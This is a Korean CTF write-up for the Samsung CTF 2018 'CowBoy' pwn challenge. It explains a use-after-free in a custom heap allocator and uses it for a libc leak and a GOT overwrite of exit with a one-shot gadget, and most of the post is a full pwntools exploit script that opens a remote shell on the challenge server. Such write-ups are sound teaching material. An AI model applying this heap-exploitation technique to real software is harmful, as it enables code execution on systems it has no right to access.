---
layout: post
disqus: true
cover: 'assets/images/sctf2018/sctf2018.png'
navigation: True
title: '[Samsung CTF 2018 Quals] - CowBoy'
date: 2018-07-19 10:18:00
tags: ctfs sctf2018
subclass: 'post tag-ctfs'
logo: 'assets/images/smlee.png'
author: smlee
categories: smlee
---

[Cowboy](https://github.com/sm1ee/ctf/blob/master/sctf2018/cowboy/cowboy), [libc.so](https://github.com/sm1ee/ctf/blob/master/sctf2018/cowboy/libc.so)
<img src="/assets/images/sctf2018/cowboy/1.png" width="100%"/>

mmap으로 메모리를 할당해 놓고, 자체적으로 구현한 bin list를 이용하여 메모리를 관리한다.  
바이너리를 열어보면 **alloc, free, show heap chunk, fill_data, exit** 총 **5가지**의 함수가 존재한다.  

기능은 다음과 같다.  
>**alloc** : 원하는 사이즈 만큼 할당 (size < 2049)  
>**free** : 지정한 chunk 해제  
>**show heap chunk** : bin list와 chunk의 주소 출력  
>**fill_data** : 원하는 chunk의 data 부분에 데이터 작성  
>**exit : 종료  

총 8개의 bins로 chunk를 관리하며 각각의 bins의 크기는 다음과 같다.  
<img src="/assets/images/sctf2018/cowboy/3.png" width="100%"/>

fill_data는 chunk에 입력 값을 write하는데 buf의 용도로 해당 chunk의 크기와 동일한 크기의 동적할당하여 memcpy 이후 해제된다.  
<img src="/assets/images/sctf2018/cowboy/4.png" width="100%"/>

이것과 alloc 이용해서 UAF를 트리거 시킬 수 있는데 chunk의 next 부분이 초기화 되지 않아서 fill_data에서 입력한 값으로 설정된다.  

여기서 show heap cunk함수로 libc leak을 할 수 있다.  

동일한 방법으로 got 주소를 가리키는 주소로 UAF 트리거 하여 bin에 적재하고 fill_data 함수로 got overwrite하면 된다.  

처음엔 Free를 one shot gadget으로 덮었지만 조건이 맞지 않아 실패하였고 exit를 덮는 방법으로 바꿔서 풀 수 있었다.  







## Exploit code:

```python
#!/usr/bin/env python
from pwn import *
import json

addr = "cowboy.eatpwnnosleep.com"
port = 14697
binary = "./cowboy"

elf = ELF(binary)

rand_plt = elf.plt['rand']
rand_got = elf.got['rand']


libc = ELF("./libc.so")
rand_offset = libc.symbols['rand']
system_offset = libc.symbols['system']

exit_got_ptr = 0x0000000000400708

s = remote(addr, port)

def auth():
    a = {
            'apikey' : '349b7ec9c6b3caa710b03589aede7a9bcf2c1466307e7f6a3ce3ef1b8c30aa0e',
        }
    s.send(json.dumps(a).encode())
    print s.recv(102400)

def menu(_index):
    sleep(0.1)
    s.recvuntil("5. exit")
    s.recvuntil("----------------------------------------")
    s.sendline(str(_index))

def alloc(_size):
    menu(1)
    sleep(0.3)
    s.recvuntil("Let's ding_malloc!\n")
    sleep(0.3)
    #s.recvuntil("Give me size n < 2049: ")
    s.sendline(str(_size))

def show_heap():
    menu(3)
    s.recvuntil("010 0x")
    rand_libc = int(s.recv(12),16)
    return rand_libc

def fill_data(_binnum, _chunknum, _data):
    menu(4)
    sleep(0.3)
    #s.recvuntil("bin num? : ")
    s.sendline(str(_binnum))
    sleep(0.3)
    #s.recvuntil("chunk num? : ")
    s.sendline(str(_chunknum))
    #s.recvuntil("input: ")
    sleep(0.3)
    s.send(_data)

def libc_leak():
    alloc(10)
    #alloc(10)
    fill_data(0,0, "A"*8+p64(rand_got))
    alloc(10)
    rand_libc = show_heap()
    return rand_libc

def solver(_system):
    fill_data(0,0, "A"*8+p64(exit_got_ptr))
    alloc(10)
    fill_data(0,4, p64(_system))
    menu(5)

auth()
rand_libc = libc_leak()

libc_base = rand_libc-rand_offset
system_libc = libc_base+system_offset
one_shot = libc_base + 0x4526a
log.info("rand_libc : %x" % rand_libc)
log.info("libc_base : %x" % libc_base)
log.info("system_libc : %x" % system_libc)
log.info("one_shot : %x" % one_shot)

solver(one_shot)

s.interactive()
s.close()
```